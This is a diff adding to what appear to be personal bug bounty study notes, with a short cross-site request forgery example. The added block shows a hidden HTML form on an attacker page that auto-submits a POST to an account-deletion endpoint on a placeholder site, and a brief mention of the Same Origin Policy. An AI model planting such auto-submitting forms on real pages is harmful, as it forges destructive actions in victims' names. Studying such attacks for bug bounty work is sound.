@@ -25,11 +25,30 @@ Cookie: SessionId=d34dc0d3
 delete=1
 ```
 
+On the malicious site
+```
+<form
+	action="http://vulnerable.com/delete_my_account"
+	method="POST"
+	id="csrf_form">
+	<input type="hidden" name="delete" value="1" />
+</form>
+
+<script>
+	document.getElementById('csrf_form').submit();
+</script>
+```
+
+
+
+
 ### Cross Domain Access Controls
 
 Same Origin Policy (Same Domain, Same Schema, Same TCP Port)
 
 ![url](https://github.com/fy0d-0r/bug_bounty_notes/blob/main/images/sop.png)
+
+
 
 
 
